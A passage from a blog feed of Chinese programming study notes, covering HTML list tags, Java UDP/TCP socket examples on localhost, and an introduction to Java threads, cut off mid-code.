class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure><p>有序列表<code>ol</code>(ordered lists)，用<code>li</code>列项，有顺序</p><ul><li><p>type属性默认值</p><p><code>1</code>默认值，数字</p><p><code>a/A</code>使用字母</p><p><code>i/I</code>罗马数字</p></li><li><p><code>ol</code>也是块元素</p></li></ul><h4 id="定义列表"><a href="#定义列表" class="headerlink" title="定义列表"></a>定义列表</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>网页标记语言<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>dl</code>(definition lists)</p><ul><li><p>有两个子标签</p><p><code>dt</code>被定义内容</p><p><code>dd</code>定义内容</p></li><li><p>都是块元素</p></li></ul><blockquote><p>列表可以嵌套使用</p><ul><li><p>各种缩写全称</p><p>ul是unordered lists的缩写 (无序列表)<br>li是list item的缩写 （列表项目）<br>ol是ordered lists的缩写（有序列表）<br>dl是definition lists的英文缩写 (自定义列表)<br>dt是definition term的缩写 (自定义列表组)<br>dd是definition description的缩写（自定义列表描述）<br>nl是navigation lists的英文缩写 （导航列表）<br>tr是table row的缩写 （表格中的一行）<br>th是table header cell的缩写 （表格中的表头）<br>td是table data cell的缩写 （表格中的一个单元格）<br>cell (巢)[翻译的好怪.]<br>cellpadding （巢补白）<br>cellspacing （巢空间）</p></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> HTML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML5 </tag>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络编程</title>
      <link href="/Programming/Java/day13_%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B.html"/>
      <url>/Programming/Java/day13_%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B.html</url>
      
        <content type="html"><![CDATA[<p>使用套接字进行编程</p><span id="more"></span><h2 id="ip与port"><a href="#ip与port" class="headerlink" title="ip与port"></a>ip与port</h2><ul><li>ip可以访问我们的设备</li><li>端口可以访问到设备里的程序</li></ul><h2 id="通信协议"><a href="#通信协议" class="headerlink" title="通信协议"></a>通信协议</h2><h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><ul><li>通信快</li><li>不需要建立连接</li><li>不可靠</li></ul><h3 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h3><ul><li>通信慢</li><li>三次握手建立连接</li><li>可靠</li></ul><blockquote><p>UDP就像发短信，TCP就像打电话是</p></blockquote><h2 id="Socket套接字"><a href="#Socket套接字" class="headerlink" title="Socket套接字"></a>Socket套接字</h2><p>在程序中使用Socket进行通信，用来指定IP,port，协议</p><p>数据发送的两步：</p><ul><li>监听：等待数据发送过来，需要指定监听的端口</li><li>发送：指定发送到哪台计算机，哪个端口</li></ul><p>socket分为接受端（服务器）和发送端（客户）</p><h1 id="UDP-1"><a href="#UDP-1" class="headerlink" title="UDP"></a>UDP</h1><h2 id="发送端"><a href="#发送端" class="headerlink" title="发送端"></a>发送端</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu.student02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.DatagramPacket;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.SocketException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UDP_Send</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        </span><br><span class="line">        DatagramSocket ds = <span class="keyword">new</span> DatagramSocket();</span><br><span class="line">        InetAddress address = InetAddress.getByName(<span class="string">&quot;localhost&quot;</span>);</span><br><span class="line">        <span class="comment">//指定接受端的端口</span></span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">9001</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">byte</span>[] buf = <span class="string">&quot;测试&quot;</span>.getBytes();</span><br><span class="line">        <span class="keyword">int</span> length = buf.length;</span><br><span class="line">        <span class="comment">//数据打包</span></span><br><span class="line">        DatagramPacket p = <span class="keyword">new</span> DatagramPacket(buf, length, address, port);</span><br><span class="line"></span><br><span class="line">        ds.send(p);</span><br><span class="line">        ds.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="接受端"><a href="#接受端" class="headerlink" title="接受端"></a>接受端</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu.student02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.DatagramPacket;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramSocket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UDP_Receive</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//设置监听端口</span></span><br><span class="line">        DatagramSocket ds = <span class="keyword">new</span> DatagramSocket(<span class="number">9001</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> length = buf.length;</span><br><span class="line">        DatagramPacket p = <span class="keyword">new</span> DatagramPacket(buf, length);</span><br><span class="line">        ds.receive(p);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(p.getData(),<span class="number">0</span>,length));</span><br><span class="line">        ds.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Linux的端口在1024以内需要root才能执行，或者关闭SELinux</p><p>发送端的端口号是系统自动分配的</p></blockquote><h2 id="循环接受"><a href="#循环接受" class="headerlink" title="循环接受"></a>循环接受</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu.student02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.DatagramPacket;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UDP_Receive</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        </span><br><span class="line">        DatagramSocket ds = <span class="keyword">new</span> DatagramSocket(<span class="number">9001</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> length = buf.length;</span><br><span class="line">        DatagramPacket dp = <span class="keyword">new</span> DatagramPacket(buf, length);</span><br><span class="line">        ds.receive(dp);</span><br><span class="line">        </span><br><span class="line">        InetAddress address = dp.getAddress();</span><br><span class="line">        String str = <span class="keyword">new</span> String(dp.getData(),<span class="number">0</span>,length);</span><br><span class="line">        System.out.println(address+<span class="string">&quot;:&quot;</span>+str);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"><span class="comment">//        ds.close();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="循环发送"><a href="#循环发送" class="headerlink" title="循环发送"></a>循环发送</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu.student02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.DatagramPacket;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.SocketException;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UDP_Send</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        </span><br><span class="line">        DatagramSocket ds = <span class="keyword">new</span> DatagramSocket();</span><br><span class="line">        InetAddress address = InetAddress.getByName(<span class="string">&quot;localhost&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">9001</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            </span><br><span class="line">            Scanner s = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">            String str = s.nextLine();</span><br><span class="line">            <span class="keyword">if</span>(str.equals(<span class="string">&quot;end&quot;</span>))<span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">byte</span>[] buf = str.getBytes();</span><br><span class="line">            <span class="keyword">int</span> length = buf.length;</span><br><span class="line">            DatagramPacket p = <span class="keyword">new</span> DatagramPacket(buf, length, address, port);</span><br><span class="line">            ds.send(p);</span><br><span class="line">        &#125;</span><br><span class="line">        ds.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="TCP-1"><a href="#TCP-1" class="headerlink" title="TCP"></a>TCP</h1><p>举一个双向聊天例子好了</p><h2 id="发送端（client）"><a href="#发送端（client）" class="headerlink" title="发送端（client）"></a>发送端（client）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu.student02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TCP_Send</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//建立连接</span></span><br><span class="line">        Socket ts = <span class="keyword">new</span> Socket(<span class="string">&quot;localhost&quot;</span>,<span class="number">9001</span>);</span><br><span class="line">        OutputStream out = ts.getOutputStream();</span><br><span class="line">        InputStream in = ts.getInputStream();</span><br><span class="line">        Scanner s  = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">byte</span>[] buf  = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">new</span> Thread() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">int</span> length = -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span>((length  = in.read(buf))!=-<span class="number">1</span>) &#123;</span><br><span class="line">                        String s = <span class="keyword">new</span> String(buf, <span class="number">0</span>, length);</span><br><span class="line">                        System.out.println(s);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;.start();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            String str = s.nextLine();</span><br><span class="line">            <span class="keyword">if</span>(str.equals(<span class="string">&quot;end&quot;</span>))<span class="keyword">break</span>;</span><br><span class="line">                out.write(str.getBytes());</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        ts.close();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="接收端（server）"><a href="#接收端（server）" class="headerlink" title="接收端（server）"></a>接收端（server）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu.student02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TCP_Receive</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        </span><br><span class="line">        ServerSocket ss = <span class="keyword">new</span> ServerSocket(<span class="number">9001</span>);</span><br><span class="line">        <span class="comment">//接受并建立发送端的连接</span></span><br><span class="line">        Socket client = ss.accept();</span><br><span class="line">        System.out.println(<span class="string">&quot;连接成功&quot;</span>);</span><br><span class="line">        Scanner s = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        </span><br><span class="line">        InputStream input  = client.getInputStream();</span><br><span class="line">        OutputStream output = client.getOutputStream();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">new</span> Thread() &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        String str = s.nextLine();</span><br><span class="line">                        <span class="keyword">if</span>(str.equals(<span class="string">&quot;end&quot;</span>))<span class="keyword">break</span>;</span><br><span class="line">                            output.write(str.getBytes());</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;          </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;.start();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> length = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>((length  = input.read(buf))!=-<span class="number">1</span>) &#123;</span><br><span class="line">            String str = <span class="keyword">new</span> String(buf, <span class="number">0</span>, length);</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        client.close();</span><br><span class="line">        ss.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>TCP的客户端可以有多个，服务端只能有一个（需要循环监听端口），在循环监听端口时监听到一个端口就可以启动客户端线程操作</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>理解多线程</title>
      <link href="/Programming/Java/day12_%E5%A4%9A%E7%BA%BF%E7%A8%8B.html"/>
      <url>/Programming/Java/day12_%E5%A4%9A%E7%BA%BF%E7%A8%8B.html</url>
      
        <content type="html"><![CDATA[<p>就像AI与玩家</p><span id="more"></span><h1 id="进程与线程"><a href="#进程与线程" class="headerlink" title="进程与线程"></a>进程与线程</h1><ul><li>启动一个程序就是一个进程，计算机都是多进程的</li><li>而进程有主线程和其他线程</li><li>也就是在进程里面有多线程</li><li>线程的作用：完成多任务，比如游戏角色和AI</li></ul><h3 id="主线程"><a href="#主线程" class="headerlink" title="主线程"></a>主线程</h3><ul><li>java的主线程都是从main方法里执行的，主线程是系统默认创建出来的（JVM）</li></ul><blockquote><p>其实CPU在同一时间只能运行一个线程，但他运算能力太快了(一秒几亿次)，多线程指的是CPU将每个线程的执行时间做了规划，这段时间执行那个线程，那段时间执行那个进程，人是感觉不到的</p></blockquote><h1 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h1><h2 id="extends-Thread"><a href="#extends-Thread" class="headerlink" title="extends Thread"></a>extends Thread</h2><ul><li><p>继承Thread</p></li><li><p>重写run方法</p></li><li><p>创建对象</p></li><li><p>调用start方法运行</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu.student01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">1000</span>; i++) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;MyThread:&quot;</span>+i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu.student01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CreateThread</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        MyThread thread =<span class="keyword">new</span> MyThread();</span><br><span class="line">        thread.start();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">1000</span>; i++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;MainThread:&quot;</span>+i);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="线程名字"><a href="#线程名字" class="headerlink" title="线程名字"></a>线程名字</h3><p>线程通常有一个默认的名字，可以在创建线程时写一个构造方法来初始化名字</p><ul><li>调用<ul><li><code>对象.getName();</code></li></ul></li><li>在类里<ul><li><code>getName();</code></li></ul></li></ul><h3 id="线程调度规则"><a href="#线程调度规则" class="headerlink" title="线程调度规则"></a>线程调度规则</h3><ul><li><p>分时调度（平均分配）</p></li><li><p>抢占式调度（按照优先级）</p><ul><li>优先级高的被执行的几率更高</li></ul></li></ul><h3 id="设置优先级"><a href="#设置优先级" class="headerlink" title="设置优先级"></a>设置优先级</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取</span></span><br><span class="line">thread.getPriority();</span><br><span class="line"><span class="comment">//设置</span></span><br><span class="line">thread.setPriority();</span><br></pre></td></tr></table></figure><h3 id="获取当前线程"><a href="#获取当前线程" class="headerlink" title="获取当前线程"></a>获取当前线程</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thread.currentThread();</span><br></pre></td></tr></table></figure><h3 id="休眠"><a href="#休眠" class="headerlink" title="休眠"></a>休眠</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thread.sleep(<span class="number">1000</span>);</span><br></pre></td></tr></table></figure><h3 id="加入主线程"><a href="#加入主线程" class="headerlink" title="加入主线程"></a>加入主线程</h3><p>重新回归主线程的那条线，从上到下执行代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thread.join();</span><br></pre></td></tr></table></figure><h3 id="守护线程"><a href="#守护线程" class="headerlink" title="守护线程"></a>守护线程</h3><p>顾名思义，若没有了其他线程，守护线程也会消失（不管有没有执行完代码）</p><p>守护线程的代码必须在启动代码前</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">thread.setDaemon();</span><br><span class="line">thread.start();</span><br></pre></td></tr></table></figure><h3 id="中断线程"><a href="#中断线程" class="headerlink" title="中断线程"></a>中断线程</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//直接击毙</span></span><br><span class="line">thread.stop();</span><br><span class="line"><span class="comment">//改变标志,线程根据这个标志主动处理中断</span></span><br><span class="line">thread.interrupt();</span><br></pre></td></tr></table></figure><h3 id="线程的生命周期"><a href="#线程的生命周期" class="headerlink" title="线程的生命周期"></a>线程的生命周期</h3><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/threadStat.png" alt="threadStat"></p><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul><li>因为单继承，所以他无法继承别的类了</li></ul><h2 id="implements-Runnable"><a href="#implements-Runnable" class="headerlink" title="implements Runnable"></a>implements Runnable</h2><p>这个接口里面只有一个抽象方法run，继承它必须实现这个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu.student01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyRunnable</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        Thread t = Thread.currentThread();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">100</span>; i++) &#123;</span><br><span class="line">            System.out.println(t.getName()+<span class="string">&quot;-&quot;</span>+i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试方法</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testRunnable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        MyRunnable r = <span class="keyword">new</span> MyRunnable();</span><br><span class="line">        </span><br><span class="line">        Thread t1 = <span class="keyword">new</span> Thread(r);</span><br><span class="line">        Thread t2 = <span class="keyword">new</span> Thread(r,<span 